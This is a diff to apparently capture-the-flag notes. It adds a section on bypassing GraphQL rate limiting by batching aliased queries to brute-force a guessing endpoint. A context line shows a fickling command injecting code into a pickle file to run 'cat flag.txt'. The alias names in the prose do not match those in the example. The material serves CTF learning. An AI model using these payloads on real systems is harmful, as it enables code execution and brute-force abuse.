@@ -236,8 +236,36 @@ fickling --inject "int(__import__('os').popen('cat flag.txt').read())" portfolio
             })
 ```
 
-- We can bypass rate limiting in graphql by using aliases.A `Query` is made to the server to get data.You can view it as either a `POST` or `GET` request to grab data.An `Alias` allows you to create multiple queries in a given request e.g if you are trying to bruteforce 
+- We can bypass rate limiting in graphql by using aliases.A `Query` is made to the server to get data.You can view it as either a `POST` or `GET` request to grab data.An `Alias` allows you to create multiple queries in a single request e.g if you are trying to bruteforce, you can send in multiple values in a single request e.g
 
+ ```graphql
+query {
+     guessNumber(number: ${number}) {
+         correct
+         message
+         flag
+      }
+   }
+```
+
+-> Alias should have different name values,you'll notice that the first name is `first2` and the other is `first1` -:
+
+```graphql
+query {
+   first1: guessNumber(number: ${number}) {
+     correct
+     message
+     flag
+   }
+   first12: guessNumber(number: ${number}) {
+     correct
+     message
+     flag
+   }
+}
+```
+
+-
 
 
 
